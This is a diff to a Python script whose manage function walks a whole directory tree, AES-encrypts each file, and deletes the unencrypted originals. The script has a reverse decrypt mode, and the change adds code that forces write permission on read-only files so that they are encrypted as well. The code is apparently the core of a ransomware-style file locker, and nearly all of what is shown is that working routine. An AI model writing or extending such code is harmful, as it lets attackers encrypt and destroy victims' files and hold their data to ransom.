@@ -1,5 +1,6 @@
 import os, random, struct
 import shutil
+import stat
 from Crypto.Cipher import AES# @UnresolvedImport
 
 
@@ -83,9 +84,9 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
     filesChanged = 0
     for subdir, dirs, files in os.walk(rootDirectionary):
         for file in files:
-            
-            try:
-                filename = os.path.join(subdir, file)
+            filename = os.path.join(subdir, file)
+            """try:
+                
                 print(filename)
                 newFile = file
                 newFile += "a"    
@@ -98,6 +99,9 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
             except IOError:
                 continue    
             os.rename(newFilename, filename)
+            """
+            if not os.access(filename, os.W_OK):
+                os.chmod(filename, stat.S_IWUSR)
             if function == 0:    
                     try:
                         encrypt_file(key, filename, None, 64*1024)
@@ -106,6 +110,8 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                     except:
                         print("Permission denied")    
                     try: 
+                        
+                        
                         if not ".enc" in filename:
                             shutil.rmtree(filename)
                             
@@ -118,6 +124,7 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                     print("Permission denied")    
                 
                 try: 
+                    
                     if ".enc" in filename:
                         shutil.rmtree(filename)
                 except OSError:
